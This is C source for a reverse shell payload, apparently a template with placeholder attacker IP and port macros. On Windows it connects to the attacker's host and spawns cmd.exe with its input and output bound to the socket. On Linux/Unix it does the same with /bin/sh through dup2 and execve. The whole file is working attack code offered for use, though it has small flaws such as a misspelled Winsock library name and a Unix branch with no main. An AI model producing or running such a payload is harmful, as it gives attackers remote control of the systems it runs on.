#include <stdio.h>

#define ATTACKER_IP TARGET_IP
#define ATTACKER_PORT TARGET_PORT

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined (_WIN64)
   
    #include <winsock2.h>
    #pragma comment(lib, "w2_32")

    WSADATA wsaData;
    SOCKET wSock;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    int main(int argc, char* argv[])
    {
    // listener ip, port on attacker's machine
    char *ip = ATTACKER_IP;
    short port = ATTACKER_PORT;

    // init socket lib
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // create socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip);

    // connect to remote host
    WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

    // start cmd.exe with redirected streams
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    exit(0);
}
#elif defined(__linux__) || defined(__unix__)
    #include <arpa/inet.h>
    #include <unistd.h>

    int payload_init() {
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_port = htons(ATTACKER_PORT);
        sa.sin_addr.s_addr = inet_addr(ATTACKER_IP);

        int sockt = socket(AF_INET, SOCK_STREAM, 0);

        if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
            printf("[ERROR] connection failed.\n");
            return (1);
        }

        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char *const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);

        return (0);
    }
#else
    #error Sorry this operating system is not supported for this beacon object file!
#endif

